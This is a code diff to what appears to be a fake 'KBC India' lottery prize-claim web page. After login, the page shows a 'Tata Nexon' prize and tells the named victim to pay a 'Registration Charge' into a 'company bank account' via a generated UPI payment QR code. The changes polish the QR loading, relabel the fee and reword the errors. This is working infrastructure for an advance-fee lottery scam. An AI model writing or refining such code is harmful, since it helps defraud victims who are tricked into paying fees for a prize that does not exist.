@@ -31,18 +31,33 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         document.getElementById("loginMess").innerText = "Login Successful";
         document.getElementById("loginMess").style.backgroundColor = "#00c04b";
         document.getElementById("loginMessage").style.display = "none";
-        var qrText = `upi://pay?pa=${userDetails.upi}&pn=KBC&tn=Welcome to KBC India&cu=INR&am=${userDetails.registrationCharge}`;
+        const img = document.getElementById('myImage');
+        const loaderContainer = document.querySelector('.load-container');
+        
+        // Add a cache-buster query string to the image URL to force reload
+        img.src = img.src + "&t=" + new Date().getTime();
+        
+        img.onload = function() {
+          loaderContainer.style.display = 'none'; // Hide loader
+          img.style.display = 'block'; // Show image
+        };
+        
+        img.onerror = function() {
+          loaderContainer.style.display = 'none'; // Hide loader on error
+          alert('Failed to load the QR.');
+        };
 
       } else {
         document.getElementById('loader').style.display = 'none';
-        document.getElementById('container').style.opacity = '1';
-        document.getElementById("loginMessage").style.display = "inline-block";
         document.getElementById('lotteryNumber').disabled = false;
         document.getElementById('mobileNumber').disabled = false;
         document.getElementById('submit').disabled = false;
-        alert('Details not found. Please check your details.');
-        document.getElementById("loginMessage").innerText = "Invalid Details";
-        document.getElementById("loginMessage").style.backgroundColor = "red";
+        document.getElementById('container').style.opacity = '1';
+        document.getElementById("loginMessage").style.display = "inline-block";
+        alert('Details not found.\nPlease check your details.');
+        document.getElementById("loginMessage").innerText = " Details Not Found";
+        document.getElementById("loginMessage").style.color = "red";
+        document.getElementById("loginMessage").style.backgroundColor = "none";
       }
     })
     .catch(error => console.error('Error:', error));
@@ -57,13 +72,20 @@ function displayDetails(userDetails) {
     <p>Lottery Number: ${userDetails.lotteryNumber}</p>
     <p>Prize Name: Tata Nexon</p>
     <p>Prize Amount: RS. ${userDetails.prizeAmount}</p>
+    <!--<p>Registration Fees: RS. <span class="indian-number">${userDetails.registrationCharge}</span></p>-->
     <p>${userDetails.feesType}: Rs. <span class="indian-number">${userDetails.registrationCharge}</span></p>
-    <!--<p>Sate: <span style="text-transform: capitalize;">${userDetails.state}</span></p>-->
+    <!--<p>State: <span style="text-transform: capitalize;">${userDetails.state}</span></p>-->
     <p>Prize Status: <span style="color: red;">Not Claimed</span></p>
     <img src="car.jpeg" style="width: 100%; border-radius: 5px; pointer-events: none;"><br><br>
     <div style="border: 2px solid #0070cb; border-radius: 10px; border-sizing: border-box;">
-    <p style="font-size: 15px; background: #0070cb; padding: 5px; color: #fff;">Dear <span style="text-transform: capitalize;">${userDetails.name}</span>, Please continue your process by paying your Registration Charge Rs. <span class="indian-number">${userDetails.registrationCharge}</span> in company bank account.</p>
-    <img src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=${userDetails.upi}%26cu=INR%26am=${userDetails.registrationCharge}" style="width: 200px; padding: 5px; pointer-events: none;"><br>
+    <p style="font-size: 15px; background: #0070cb; padding: 5px; color: #fff;">Dear <span style="text-transform: capitalize;">${userDetails.name}</span>, Please continue your process by paying your ${userDetails.feesType} Rs. <span class="indian-number">${userDetails.registrationCharge}</span> in company bank account.</p>
+    
+    <center>
+    <div class="load-container">
+        <div class="load"></div>
+    </div>
+    <img id="myImage" src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=${userDetails.upi}%26cu=INR%26am=${userDetails.registrationCharge}"/>
+    </center>
     <p><span style="color:#fff; background: #0070cb; padding: 5px 15px; border-radius: 5px; pointer-events: none;">SCAN TO PAY</span></p>
     </div>
     <p>--------X--------</p>
